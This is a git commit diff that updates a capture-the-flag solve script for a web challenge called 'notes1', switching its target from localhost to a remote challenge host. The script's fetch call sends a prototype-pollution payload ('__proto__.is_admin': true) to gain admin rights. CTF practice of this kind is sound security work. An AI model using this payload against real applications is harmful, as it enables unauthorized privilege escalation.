fd58af38638de59b0ed5dca6c81a93dfa9963a7b
Jonathan Tay <jontay999@gmail.com>
2024-09-13 19:01:55 +0800

    update solves

--- Web/notes1/solve/solve.py
+++ Web/notes1/solve/solve.py
@@ -1,7 +1,7 @@
 import requests 
 
-
 URL = "http://localhost:3004"
+URL = "https://notes1.ivan-and-keane-hard.work"
 s = requests.session()
 
 s.post(f"{URL}/api/register", {
@@ -19,7 +19,7 @@ s.post(f"{URL}/api/create",
 
 """
 
-a = await fetch("http://localhost:3004/api/create", {
+a = await fetch("https://notes1.ivan-and-keane-hard.work/api/create", {
   "body": "{\"title\":\"dd\",\"content\":\"dd\", \"__proto__.is_admin\": true}",
   "method": "POST"
 });
